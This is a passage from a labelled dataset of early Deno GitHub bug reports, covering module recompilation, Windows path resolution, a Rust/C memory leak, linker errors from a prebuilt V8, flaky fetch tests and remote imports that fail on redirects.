\"2.ts\";\r\nconsole.log(\"1.ts\");\r\n```\r\nand another file `2.ts`:\r\n```\r\nimport \"1.ts\";\r\nconsole.log(\"2.ts\");\r\n```\r\nWith latest master, running `deno 1.ts --recompile` would generate the following:\r\n```\r\nCompiling /Users/kevinqian/Desktop/Programming/Deno/test/deps/1.ts\r\nCompiling /Users/kevinqian/Desktop/Programming/Deno/test/deps/2.ts\r\nCompiling /Users/kevinqian/Desktop/Programming/Deno/test/deps/1.ts  <== duplicate compilation\r\n2.ts\r\n1.ts\r\n```"},{"labels":["bug"],"text":"example: https://github.com/denoland/deno/commit/0ceb554343ff3d311a19f027b7aa8f0806bbb162#diff-b9d53e20d7eb637f2c93606fc9b689b4L36\r\n\r\n"},{"labels":["bug"],"text":"There is some problem on Windows WRT to module resolution and the `$DENO_DIR` environmental variable.\r\nI've seen it in https://github.com/denoland/deno/pull/1356 and https://github.com/denoland/deno_std/pull/37\r\n```\r\n2018-12-20T21:08:48.3095557Z C:\\Users\\VssAdministrator\\.deno\\bin\\deno.exe test.ts --allow-run --allow-net\r\n2018-12-20T21:08:48.3724814Z ##[command]\"C:\\Windows\\system32\\cmd.exe\" /D /E:ON /V:OFF /S /C \"CALL \"D:\\a\\_temp\\eaf9adfb-fc74-4aa4-9a31-70201da22e50.cmd\"\"\r\n2018-12-20T21:08:48.9943938Z Compiling D:/a/1/s/test.ts\r\n2018-12-20T21:08:49.6446393Z Downloading https://deno.land/x/testing/testing.ts...\r\n2018-12-20T21:08:49.8951715Z Downloading https://deno.land/x/testing/util... NOT FOUND\r\n2018-12-20T21:08:50.1296920Z Downloading https://deno.land/x/testing/util.ts...\r\n2018-12-20T21:08:51.0053504Z ‌error‌ TS5009: ‌Cannot find the common subdirectory path for the input files.‌\r\n2018-12-20T21:08:51.0054022Z \r\n```\r\n\r\nYou can reproduce this by cloning https://github.com/denoland/deno_std and running `deno test.ts`"},{"labels":["bug"],"text":"Reported by @F001:\r\n\r\n>  In \"isolate.rs\" fn respond, the buf is converted to deno_buf. This conversion is actually calling deno_buf::from(Buf) . In the from method, Box::into_rawis called. This function actually leaks memory. The caller should properly destroy T and release the memory. When we are doing this, we should not free the memory in C code. Instead, we'd better pass the raw pointer back to Rust, and call Box::from_raw to properly call destructor. But I can't find Box::from_raw in the project. I guess the memory is leaked when it was passed from Rust to C ? I think the comment in fn respond is misleading. The rust code has prevented the destruction ofbuf in this function. No body are going to free the memory, either in Rust or C.\r\n\r\nI've had a quick look and I think this is indeed a memory leak.\r\n\r\nThis is a big oversight. We need to be running [LeakSanitizer](https://www.chromium.org/developers/testing/leaksanitizer) in CI. (https://cs.chromium.org/chromium/src/build/config/sanitizers/sanitizers.gni?l=12&rcl=fb0e572f11d5be35992300d1a3c92f66352a46af)"},{"labels":["bug"],"text":"introduced because of prebuilt v8: 89096c92104ab89b1fd8ba273cbbf441dcfe5a84\r\n\r\nfixed with this small change: https://github.com/denoland/deno/pull/1218/commits/e5f204fe49ef492ab97bdc4dff43be731dbbde25\r\n\r\nerror looks like:\r\n```\r\nUndefined symbols for architecture x86_64:\r\n  \"_GFp_BN_mod_exp_mont_consttime\", referenced from:\r\n      ring::rsa::bigint::elem_exp_consttime::h2efacbbd9e4e21e0 in libring.rlib(ring.ring0.rcgu.o)\r\n      ring::rsa::bigint::elem_exp_consttime::h3426a412925f976d in libring.rlib(ring.ring0.rcgu.o)\r\n  \"_GFp_ChaCha20_ctr32\", referenced from:\r\n      ring::chacha::chacha20_xor_inner::hf30e5b063ebef8b4 in libring.rlib(ring.ring3.rcgu.o)\r\n  \"_GFp_aes_gcm_init\", referenced from:\r\n      ring::aead::aes_gcm::aes_gcm_init::ha96301199aec9555 in libring.rlib(ring.ring1.rcgu.o)\r\n  \"_GFp_aes_gcm_open\", referenced from:\r\n      ring::aead::aes_gcm::aes_gcm_open::h14dd843bc8019d2c in libring.rlib(ring.ring1.rcgu.o)\r\n  \"_GFp_aes_gcm_seal\", referenced from:\r\n      ring::aead::aes_gcm::aes_gcm_seal::he6127808aee18c16 in libring.rlib(ring.ring1.rcgu.o)\r\n  \"_GFp_bn_from_montgomery_in_place\", referenced from:\r\n      ring::rsa::bigint::elem_reduced::h335920a66181b2ca in libring.rlib(ring.ring0.rcgu.o)\r\n      ring::rsa::bigint::elem_reduced::hfd1cb7935a230833 in libring.rlib(ring.ring0.rcgu.o)\r\n  \"_GFp_bn_mul_mont\", referenced from:\r\n      _$LT$ring..rsa..bigint..Elem$LT$M$C$$u20$E$GT$$GT$::decode_once::h729f2dd7e9b20fa6 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Elem$LT$M$C$$u20$E$GT$$GT$::decode_once::hd38f8b3009519726 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Elem$LT$M$C$$u20$E$GT$$GT$::decode_once::hde9891061745b4c4 in libring.rlib(ring.ring0.rcgu.o)\r\n      ring::rsa::bigint::elem_mul::h0cca3d12252441fa in libring.rlib(ring.ring0.rcgu.o)\r\n      ring::rsa::bigint::elem_mul::h0fbdbc0b7b58b0bd in libring.rlib(ring.ring0.rcgu.o)\r\n      ring::rsa::bigint::elem_mul::h16fb48cdfef13061 in libring.rlib(ring.ring0.rcgu.o)\r\n      ring::rsa::bigint::elem_mul::h3e9c6c465e5d019c in libring.rlib(ring.ring0.rcgu.o)\r\n      ...\r\n  \"_GFp_bn_mul_mont_check_num_limbs\", referenced from:\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::h6022c58e668aa065 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::h67711c5b43ee16ff in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::ha4b167d513256fc8 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::hadb2fe63a695d454 in libring.rlib(ring.ring0.rcgu.o)\r\n  \"_GFp_bn_neg_inv_mod_r_u64\", referenced from:\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::h6022c58e668aa065 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::h67711c5b43ee16ff in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::ha4b167d513256fc8 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..Modulus$LT$M$GT$$GT$::from_boxed_limbs::hadb2fe63a695d454 in libring.rlib(ring.ring0.rcgu.o)\r\n  \"_GFp_cpuid_setup\", referenced from:\r\n      ring::init::init_once::_$u7b$$u7b$closure$u7d$$u7d$::hedc6f60cf5281be0 in libring.rlib(ring.ring1.rcgu.o)\r\n  \"_GFp_memcmp\", referenced from:\r\n      ring::constant_time::verify_slices_are_equal::hb8d4db7f7784f07e in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_nistz256_add\", referenced from:\r\n      ring::ec::suite_b::ops::p256::COMMON_OPS::h84656d1efcc49c76 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_nistz256_mul_mont\", referenced from:\r\n      ring::ec::suite_b::ops::p256::COMMON_OPS::h84656d1efcc49c76 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_nistz256_point_add\", referenced from:\r\n      ring::ec::suite_b::ops::p256::COMMON_OPS::h84656d1efcc49c76 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_nistz256_point_mul\", referenced from:\r\n      ring::ec::suite_b::ops::p256::PRIVATE_KEY_OPS::h8f822d1aaf4b4c7e in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_nistz256_point_mul_base\", referenced from:\r\n      ring::ec::suite_b::ops::p256::p256_point_mul_base_impl::hbca360dcfbe9df03 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_nistz256_sqr_mont\", referenced from:\r\n      ring::ec::suite_b::ops::p256::COMMON_OPS::h84656d1efcc49c76 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_nistz384_point_add\", referenced from:\r\n      ring::ec::suite_b::ops::p384::COMMON_OPS::he95591db372a3360 in libring.rlib(ring.ring7.rcgu.o)\r\n  \"_GFp_nistz384_point_mul\", referenced from:\r\n      ring::ec::suite_b::ops::p384::PRIVATE_KEY_OPS::h8a0fd939cd0f657d in libring.rlib(ring.ring7.rcgu.o)\r\n  \"_GFp_p256_scalar_mul_mont\", referenced from:\r\n      ring::ec::suite_b::ops::p256::p256_scalar_inv_to_mont::mul::ha8f8ba11e093df73 in libring.rlib(ring.ring6.rcgu.o)\r\n      ring::ec::suite_b::ops::p256::p256_scalar_inv_to_mont::sqr_mul_acc::h935b7549d66d52d9 in libring.rlib(ring.ring6.rcgu.o)\r\n      ring::ec::suite_b::ops::p256::p256_scalar_inv_to_mont::to_mont::he1d4cdb03e5fd9fb in libring.rlib(ring.ring6.rcgu.o)\r\n      ring::ec::suite_b::ops::p256::SCALAR_OPS::hd8d3f6cb0cb75969 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_p256_scalar_sqr_mont\", referenced from:\r\n      ring::ec::suite_b::ops::p256::p256_scalar_inv_to_mont::sqr::h6047b3283ade120a in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_p256_scalar_sqr_rep_mont\", referenced from:\r\n      ring::ec::suite_b::ops::p256::p256_scalar_inv_to_mont::sqr_mul::hd7c34afbd45c4386 in libring.rlib(ring.ring6.rcgu.o)\r\n      ring::ec::suite_b::ops::p256::p256_scalar_inv_to_mont::sqr_mul_acc::h935b7549d66d52d9 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_p384_elem_add\", referenced from:\r\n      ring::ec::suite_b::ops::p384::COMMON_OPS::he95591db372a3360 in libring.rlib(ring.ring7.rcgu.o)\r\n  \"_GFp_p384_elem_mul_mont\", referenced from:\r\n      ring::ec::suite_b::ops::p384::GFp_p384_elem_sqr_mont::h7e0f2d5dc9810eef in libring.rlib(ring.ring7.rcgu.o)\r\n      ring::ec::suite_b::ops::p384::COMMON_OPS::he95591db372a3360 in libring.rlib(ring.ring7.rcgu.o)\r\n  \"_GFp_p384_scalar_mul_mont\", referenced from:\r\n      ring::ec::suite_b::ops::p384::p384_scalar_inv_to_mont::mul::h5ede5a094aeced52 in libring.rlib(ring.ring7.rcgu.o)\r\n      ring::ec::suite_b::ops::p384::p384_scalar_inv_to_mont::sqr::heb31b88e5c7dfb1d in libring.rlib(ring.ring7.rcgu.o)\r\n      ring::ec::suite_b::ops::p384::p384_scalar_inv_to_mont::sqr_mut::hd7f4af2dc7688f8a in libring.rlib(ring.ring7.rcgu.o)\r\n      ring::ec::suite_b::ops::p384::p384_scalar_inv_to_mont::sqr_mul_acc::h4bdc99023c95b324 in libring.rlib(ring.ring7.rcgu.o)\r\n      ring::ec::suite_b::ops::p384::p384_scalar_inv_to_mont::to_mont::h51d783aa7981ee68 in libring.rlib(ring.ring7.rcgu.o)\r\n      ring::ec::suite_b::ops::p384::SCALAR_OPS::h6a47e39b7f102597 in libring.rlib(ring.ring7.rcgu.o)\r\n  \"_GFp_poly1305_blocks\", referenced from:\r\n      ring::poly1305::SigningContext::from_key::hc874d662904d74ef in libring.rlib(ring.ring3.rcgu.o)\r\n  \"_GFp_poly1305_emit\", referenced from:\r\n      ring::poly1305::SigningContext::from_key::hc874d662904d74ef in libring.rlib(ring.ring3.rcgu.o)\r\n  \"_GFp_poly1305_init_asm\", referenced from:\r\n      ring::poly1305::init::hf7ac8b932f675edc in libring.rlib(ring.ring3.rcgu.o)\r\n  \"_GFp_sha256_block_data_order\", referenced from:\r\n      ring::digest::SHA256::hdb690df8c8bd7b61 in libring.rlib(ring.ring12.rcgu.o)\r\n  \"_GFp_sha512_block_data_order\", referenced from:\r\n      ring::digest::SHA384::h32931267b7502c85 in libring.rlib(ring.ring12.rcgu.o)\r\n      ring::digest::SHA512::h159a93b7323ece03 in libring.rlib(ring.ring12.rcgu.o)\r\n      ring::digest::SHA512_256::h027f5e82497d2592 in libring.rlib(ring.ring12.rcgu.o)\r\n  \"_GFp_x25519_fe_invert\", referenced from:\r\n      ring::ec::curve25519::ops::encode_point::h591a8bd7ffd8e2cc in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_x25519_fe_isnegative\", referenced from:\r\n      ring::ec::curve25519::ops::encode_point::h591a8bd7ffd8e2cc in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_x25519_fe_mul_ttt\", referenced from:\r\n      ring::ec::curve25519::ops::encode_point::h591a8bd7ffd8e2cc in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_x25519_fe_neg\", referenced from:\r\n      _$LT$ring..ec..curve25519..ops..Elem$LT$ring..ec..curve25519..ops..T$GT$$GT$::negate::he4d19bf3740d26f4 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_x25519_fe_tobytes\", referenced from:\r\n      ring::ec::curve25519::ops::encode_point::h591a8bd7ffd8e2cc in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_x25519_ge_double_scalarmult_vartime\", referenced from:\r\n      _$LT$ring..ec..curve25519..ed25519..EdDSAParameters$u20$as$u20$ring..signature..VerificationAlgorithm$GT$::verify::h3b5af8e6e66a0686 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_GFp_x25519_ge_frombytes_vartime\", referenced from:\r\n      ring::ec::curve25519::ops::ExtPoint::from_encoded_point_vartime::h549e6ef94027c7c1 in libring.rlib(ring.ring6.rcgu.o)\r\n  \"_GFp_x25519_ge_scalarmult_base\", referenced from:\r\n      ring::ec::curve25519::ed25519::KeyPair::from_seed_::h1c78ca915f081e82 in libring.rlib(ring.ring13.rcgu.o)\r\n      ring::ec::curve25519::ed25519::KeyPair::sign::h5d0703a7f09e68da in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_GFp_x25519_public_from_private\", referenced from:\r\n      ring::ec::curve25519::x25519::x25519_public_from_private::h017a53f65b795ada in libring.rlib(ring.ring1.rcgu.o)\r\n  \"_GFp_x25519_sc_mask\", referenced from:\r\n      ring::ec::curve25519::ed25519::KeyPair::from_seed_::h1c78ca915f081e82 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_GFp_x25519_sc_muladd\", referenced from:\r\n      ring::ec::curve25519::ed25519::KeyPair::sign::h5d0703a7f09e68da in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_GFp_x25519_sc_reduce\", referenced from:\r\n      ring::ec::curve25519::ed25519::digest_scalar::h2a8ce959dce90d21 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_GFp_x25519_scalar_mult\", referenced from:\r\n      ring::ec::curve25519::x25519::x25519_ecdh::hfe37aa4973f8535a in libring.rlib(ring.ring1.rcgu.o)\r\n  \"_LIMBS_add_mod\", referenced from:\r\n      ring::ec::suite_b::ops::scalar_sum::h1f0669698aefbdda in libring.rlib(ring.ring9.rcgu.o)\r\n      ring::rsa::bigint::elem_add::h4074c2175df6ec70 in libring.rlib(ring.ring0.rcgu.o)\r\n      ring::rsa::bigint::elem_add::hed534a6ad089d5b4 in libring.rlib(ring.ring0.rcgu.o)\r\n  \"_LIMBS_are_even\", referenced from:\r\n      ring::limb::limbs_are_even_constant_time::h565420e6a4b9b7f5 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_LIMBS_are_zero\", referenced from:\r\n      ring::limb::limbs_are_zero_constant_time::hf15626161850aa87 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_LIMBS_equal_limb\", referenced from:\r\n      ring::limb::limbs_equal_limb_constant_time::h47832576b2792d15 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_LIMBS_less_than\", referenced from:\r\n      ring::limb::limbs_less_than_limbs_consttime::hd0cbd73bf275c153 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_LIMBS_less_than_limb\", referenced from:\r\n      ring::limb::limbs_less_than_limb_constant_time::hb63585a939c1c791 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_LIMBS_reduce_once\", referenced from:\r\n      ring::limb::limbs_reduce_once_constant_time::h82b3059038ba84c0 in libring.rlib(ring.ring13.rcgu.o)\r\n  \"_LIMBS_shl_mod\", referenced from:\r\n      _$LT$ring..rsa..bigint..One$LT$M$C$$u20$ring..arithmetic..montgomery..RR$GT$$GT$::newRR::h24e48d41b3b4da86 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..One$LT$M$C$$u20$ring..arithmetic..montgomery..RR$GT$$GT$::newRR::h2fabef6590fd6171 in libring.rlib(ring.ring0.rcgu.o)\r\n      _$LT$ring..rsa..bigint..One$LT$M$C$$u20$ring..arithmetic..montgomery..RR$GT$$GT$::newRR::h59eef47c3ed00450 in libring.rlib(ring.ring0.rcgu.o)\r\n  \"_LIMBS_sub_mod\", referenced from:\r\n      ring::rsa::bigint::elem_sub::hda91498f8ca22403 in libring.rlib(ring.ring0.rcgu.o)\r\nld: symbol(s) not found for architecture x86_64\r\nclang: error: linker command failed with exit code 1 (use -v to see invocation)\r\nTraceback (most recent call last):\r\n  File \"../../build/toolchain/mac/linker_driver.py\", line 229, in <module>\r\n    Main(sys.argv)\r\n  File \"../../build/toolchain/mac/linker_driver.py\", line 79, in Main\r\n    subprocess.check_call(compiler_driver_args)\r\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/subprocess.py\", line 540, in check_call\r\n```"},{"labels":["bug"],"text":"```\r\nlld-link: error: /failifmismatch: mismatch detected: 2 and 0 for key _ITERATOR_DEBUG_LEVEL\r\n```\r\ncaused by prebuilt V8 (89096c92104ab89b1fd8ba273cbbf441dcfe5a84) \r\nv8.lib is built in release mode and links to different libc `/MD` vs `/MDd` flags.\r\n\r\n\r\nyou can also set `use_prebuilt_v8=false` in `target/debug/args.gn`"},{"labels":["bug",null],"text":"Note the issue was only appearing on Windows. So ideally someone on Windows would debug this. The first set is to uncomment the tests and see if you can repeat the failure.\r\n\r\nhttps://github.com/denoland/deno/blob/570269b73de713afcff712977d11a3910ed849ad/js/fetch_test.ts#L50-L161\r\n\r\n"},{"labels":["bug"],"text":"Only happening occasionally - only observed on windows. \r\n```\r\ntest fetchPostBodyTypedArray_permW0N1E0R0\r\nHttpUser: connection closed\r\n    at maybeError (deno/js/errors.ts:38:12)\r\n    at handleAsyncMsgFromRust (deno/js/dispatch.ts:27:17)\r\ntest result: FAILED. 7 passed; 1 failed; 0 ignored; 0 measured; 206 filtered out\r\nError: There were 1 test failures.\r\n    at setTimeout (file:///C:/deno/js/testing/testing.ts:110:13)\r\n    at fire (deno/js/timers.ts:131:3)\r\n```\r\n\r\nex: https://ci.appveyor.com/project/deno/deno/builds/20541747"},{"labels":["bug"],"text":"In REPL, something like\r\n```\r\n> setTimeout(() => console.log(1), 1);\r\n```\r\nnever fires"},{"labels":["bug"],"text":"I don't know if it's desired behavior to follow redirects, but it's not specified and I've noticed that it doesn't; if it's not supposed to, then I'd at least expect a message about why it refused to load.\r\n\r\nThis HTTP endpoint returns a redirect to a HTTPS version of itself:\r\n\r\n```http\r\n$ http HEAD http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nHTTP/1.1 301 Moved Permanently\r\n...\r\nLocation: https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\n```\r\n\r\nDeno fails to load that module path:\r\n\r\n```\r\n$ deno -D -r --recompile http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG RS - starting background reactor\r\nDEBUG RS - msg_from_js Start sync true\r\nDEBUG JS - cwd /home/ns/dev/deno/deno-remote-import-bug\r\nDEBUG JS - args [ \"http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\" ]\r\nDEBUG JS - compiler.run { moduleSpecifier: \"http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\", containingFile: \"/home/ns/dev/deno/deno-remote-import-bug/\" }\r\nDEBUG JS - compiler.resolveModule { moduleSpecifier: \"http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\", containingFile: \"/home/ns/dev/deno/deno-remote-import-bug/\" }\r\nDEBUG JS - compiler.resolveFileName { moduleSpecifier: \"http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\", containingFile: \"/home/ns/dev/deno/deno-remote-import-bug/\" }\r\nDEBUG JS - os.ts codeFetch http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts /home/ns/dev/deno/deno-remote-import-bug/\r\nDEBUG RS - code_fetch. module_specifier http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts containing_file /home/ns/dev/deno/deno-remote-import-bug/\r\nDEBUG RS - resolve_module module_specifier http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts containing_file /home/ns/dev/deno/deno-remote-import-bug/\r\nDEBUG RS - module_name: http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts, filename: /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDownloading http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=80\r\nDEBUG RS - connecting to 151.139.237.11:80\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 79 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 473 bytes\r\nDEBUG RS - parsed 7 headers\r\nDEBUG RS - incoming body is content-length (178 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"http://cdn.rawgit.com\", Http1)\r\nDEBUG RS - Trying http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts.ts...\r\nDownloading http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts.ts\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=80\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG RS - connecting to 151.139.237.11:80\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 82 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 476 bytes\r\nDEBUG RS - parsed 7 headers\r\nDEBUG RS - incoming body is content-length (178 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"http://cdn.rawgit.com\", Http1)\r\nDEBUG RS - Trying http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts.js...\r\nDownloading http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts.js\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=80\r\nDEBUG RS - connecting to 151.139.237.11:80\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 82 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 476 bytes\r\nDEBUG RS - parsed 7 headers\r\nDEBUG RS - incoming body is content-length (178 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"http://cdn.rawgit.com\", Http1)\r\nDEBUG RS - msg_from_js CodeFetch sync true\r\nDEBUG RS - op err Cannot resolve module \"http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\" from \"/home/ns/dev/deno/deno-remote-import-bug/\"\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG JS - compiler.getGeneratedContents gen/bundle/main.js\r\nDEBUG JS - compiler.getGeneratedContents main.js.map\r\nDEBUG JS - compiler.getGeneratedContents deno_main.js\r\nNotFound: Cannot resolve module \"http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\" from \"/home/ns/dev/deno/deno-remote-import-bug/\"\r\n    at maybeError (deno/js/errors.ts:25:12)\r\n    at maybeThrowError (deno/js/errors.ts:14:15)\r\n    at sendSync (deno/js/dispatch.ts:70:5)\r\n    at Object.codeFetch (deno/js/os.ts:31:19)\r\n    at DenoCompiler.resolveModule (deno/js/compiler.ts:525:38)\r\n    at DenoCompiler.run (deno/js/compiler.ts:557:33)\r\n    at denoMain (deno/js/main.ts:72:12)\r\n    at deno_main.js:1:1\r\n```\r\n\r\n---\r\n\r\n```shell\r\n$ deno --version\r\ndeno: 0.1.7\r\nv8: 7.0.276.15\r\n```\r\n\r\nSee also #930."},{"labels":["bug"],"text":"`entry.ts`\r\n```typescript\r\nimport message from \"./dep\";\r\nconsole.log(message);\r\n```\r\n\r\n`dep.ts`\r\n```typescript\r\nexport default \"success\";\r\n```\r\n\r\n---\r\n\r\nRunning `entry.ts` locally works fine:\r\n\r\n```shell\r\n$ deno entry\r\nsuccess\r\n```\r\n\r\nWhen attempting to run `entry.ts` over HTTPS, it:\r\n\r\n* Loads `entry.ts` fine.\r\n* Attempts to load `dep.ts` over *HTTP* rather than HTTPS.\r\n* Gets a redirect to HTTPS, but does not follow it (see #931).\r\n* Fails to find `dep.ts`.\r\n\r\n---\r\n\r\n```\r\n$ deno -D -r --recompile https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\r\nDEBUG RS - starting background reactor\r\nDEBUG RS - msg_from_js Start sync true\r\nDEBUG JS - cwd /home/ns/dev/deno/deno-remote-import-bug\r\nDEBUG JS - args [ \"https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\" ]\r\nDEBUG JS - compiler.run { moduleSpecifier: \"https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\", containingFile: \"/home/ns/dev/deno/deno-remote-import-bug/\" }\r\nDEBUG JS - compiler.resolveModule { moduleSpecifier: \"https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\", containingFile: \"/home/ns/dev/deno/deno-remote-import-bug/\" }\r\nDEBUG JS - compiler.resolveFileName { moduleSpecifier: \"https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\", containingFile: \"/home/ns/dev/deno/deno-remote-import-bug/\" }\r\nDEBUG JS - os.ts codeFetch https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry /home/ns/dev/deno/deno-remote-import-bug/\r\nDEBUG RS - code_fetch. module_specifier https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry containing_file /home/ns/dev/deno/deno-remote-import-bug/\r\nDEBUG RS - resolve_module module_specifier https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry containing_file /home/ns/dev/deno/deno-remote-import-bug/\r\nDEBUG RS - module_name: https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry, filename: /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\r\nDownloading https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=443\r\nDEBUG RS - connecting to 151.139.237.11:443\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 76 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 596 bytes\r\nDEBUG RS - parsed 14 headers\r\nDEBUG RS - incoming body is content-length (104 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"https://cdn.rawgit.com\", Http1)\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG RS - Trying https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts...\r\nDownloading https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=443\r\nDEBUG RS - connecting to 151.139.237.11:443\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 79 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 535 bytes\r\nDEBUG RS - parsed 14 headers\r\nDEBUG RS - incoming body is chunked encoding\r\nDEBUG RS - incoming chunked header: 0x33 (51 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"https://cdn.rawgit.com\", Http1)\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG RS - set file perm to 438\r\nDEBUG RS - load_cache /home/ns/.deno/gen/6cfe4395a52dff9e4cee4a9cf7b88d56d2d44c19.js\r\nDEBUG RS - msg_from_js CodeFetch sync true\r\nDEBUG JS - resolveModule sourceCode length: 51\r\nDEBUG JS - resolveModule has outputCode: false\r\nDEBUG JS - compiler.setFileName { moduleSpecifier: \"https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry\", containingFile: \"/home/ns/dev/deno/deno-remote-import-bug/\" }\r\nDEBUG JS - compiler._resolveDependencies /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nCompiling https://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG JS - getCurrentDirectory()\r\nDEBUG JS - getScriptSnapshot() /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG JS - getScriptVersion() 